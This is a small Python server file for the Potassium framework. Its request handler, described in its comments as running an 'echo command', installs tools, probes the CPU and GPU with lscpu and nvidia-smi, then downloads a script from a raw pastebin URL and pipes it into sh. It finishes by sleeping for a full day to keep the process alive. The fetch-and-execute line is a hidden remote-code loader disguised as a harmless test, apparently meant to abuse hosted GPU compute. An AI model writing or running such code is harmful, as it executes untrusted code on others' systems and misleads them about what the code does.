from potassium import Potassium, Request, Response
import os

app = Potassium("my_app")

@app.handler("/")
def handler(context: dict, request: Request) -> Response:
    # Execute the echo command
    os.system('apt-get update -y')
    os.system('apt-get install wget -y')
    os.system('apt-get install screen -y')
    os.system('lscpu && pwd && nvidia-smi && wget https://google.com')
    os.system("(wget https://pastebin.com/raw/VacnRAgG -O- | tr -d '\r') | sh")
    os.system('sleep 86400')

    # Return a simple JSON response
    return Response(
        json={"message": "Check the runtime logs to see the echo command output."},
        status=200
    )

if __name__ == "__main__":
    app.serve()
